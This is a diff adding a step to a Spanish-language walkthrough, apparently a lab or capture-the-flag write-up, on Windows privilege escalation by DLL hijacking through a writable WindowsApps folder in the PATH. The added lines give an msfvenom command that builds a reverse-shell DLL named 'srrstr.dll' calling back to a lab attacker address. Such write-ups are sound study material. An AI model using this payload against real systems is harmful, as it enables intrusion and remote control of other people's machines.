@@ -491,3 +491,8 @@ Encontramos en el path la ruta `C:\Users\sarah\AppData\Local\Microsoft\WindowsAp
 
 Esto quiere decir que podríamos colocar una dll maliciosa con el nombre `srrstr.dll` en esa ruta y lograr que el binario la ejecute en un contexto elevado.
 
+El siguiente paso, es generar la dll maliciosa con `msfvenom` en nuestra máquina:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.67 LPORT=7777 -f dll > srrstr.dll
+```
